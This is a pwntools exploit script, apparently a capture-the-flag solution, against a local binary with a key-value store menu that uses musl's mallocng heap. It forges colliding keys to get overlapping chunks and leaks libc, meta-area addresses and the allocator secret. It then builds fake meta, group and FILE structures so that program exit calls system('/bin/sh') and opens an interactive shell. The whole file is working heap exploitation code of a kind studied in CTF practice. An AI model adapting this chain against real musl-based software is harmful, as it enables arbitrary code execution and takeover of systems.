from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'option: '
def add(key, value, key_size=None, value_size=None):
	sla(menu, b'1')
	if key_size is None:
		key_size = len(key)
	if value_size is None:
		value_size = len(value)	
	sla(b'key size: ', byte(key_size))
	sda(b'key content: ', key)
	sla(b'value size: ', byte(value_size))
	sda(b'value content: ', value)

def show(key, key_size=None):
	sla(menu, b'2')
	if key_size is None:
		key_size = len(key)
	sla(b'key size: ', byte(key_size))
	sda(b'key content: ', key)

def dele(key, key_size=None):
	sla(menu, b'3')
	if key_size is None:
		key_size = len(key)
	sla(b'key size: ', byte(key_size))
	sda(b'key content: ', key)

def get_leak():
	leak = 0
	for i in range(8):
		l = int(rc(2), 16)
		leak |= l << (8*i);
	return leak

def get_index(key):
	mul = 2021
	for ch in key:
		mul = 0x13377331 * mul + ord(ch)
	return mul & 0xffffffff

def get_key(key):
	i = 0
	index = get_index(key) & 0xFFF
	while True:
		if (get_index(str(i))&0xFFF) == index and str(i) != key:
			return str(i).encode()
		i += 1

add(b'A', b'B')
for _ in range(5):
	show(b'A'*0x30)
add(b'B', b'B'*0x30)
add(get_key('B'), b'B')
dele(b'B')
for _ in range(3):
	show(b'A'*0x30)
add(b'C', b'C'*0x1000)
show(b'B')
rut(b'0x30:')
class0_group_addr = get_leak() - 0x70
libc.address = get_leak() + 0x3fe0
get_leak()
get_leak()
key = get_leak() - 1
info('class0_group_addr', class0_group_addr)
info('libc_base', libc.address)
info('key', key)
for _ in range(3):
	show(b'B'*0x30)
pay = p64(class0_group_addr+0x30) + p64(class0_group_addr) + p64(1) + p64(0x30) + p64(key) + p64(0)
show(pay)
show(b'B')
rut(b'0x30:')
meta_addr = get_leak()
meta_area_addr = meta_addr & (~0xFFF)
info('meta_addr', meta_addr)
info('meta_area_addr', meta_area_addr)
for _ in range(3):
	show(b'C'*0x30)
pay = p64(class0_group_addr+0x30) + p64(meta_area_addr) + p64(1) + p64(0x30) + p64(key) + p64(0)
show(pay)
show(b'B')
rut(b'0x30:')
secret = get_leak()
info('secret', secret)

system = libc.sym.system
binsh = next(libc.search(b'/bin/sh'))
stderr = libc.sym.__stderr_used
stdout = libc.sym.__stdout_used
info('system', system)
info('binsh', binsh)
info('__stderr_used', stderr)
info('__stdout_used', stdout)

for _ in range(2):
	show(b'B'*0x30)

fake_file_addr = libc.address - 0x3000 + 0x560
fake_meta_addr = libc.address - 0x2000 + 0x10
fake_group_addr = libc.address - 0x2000 + 0x40

info('fake_file_addr', fake_file_addr)
info('fake_meta_addr', fake_meta_addr)
info('fake_group_addr', fake_group_addr)

key_pay = p64(class0_group_addr+0x20) + p64(fake_group_addr+0x10) + p64(1) + p64(0x30) + p64(get_index('B')) + p64(0) 

fake_file = b'/bin/sh\x00' + p64(0)*6 + p64(1) + p64(0) + p64(system)

maplen, sizecalss, last_idx, freeable = 1, 8, 0, 1
union = last_idx + (freeable<<5) + (sizecalss<<6) + (maplen<<12)

fake_meta = p64(fake_file_addr) + p64(stderr) + p64(fake_group_addr) + p64(0) + p64(union) + p64(0)
fake_group = p64(fake_meta_addr) + p64(1) + p64(0)

value_pay = fake_file.ljust(0x1000-0x560, b'\x00') + p64(secret).ljust(0x10, b'\x00') + fake_meta + fake_group + b'\x00'*0x530

add(key_pay, value_pay)
dele(get_key('B'))
dele(b'B')
sla(menu, b'4')
#debug()
sh()
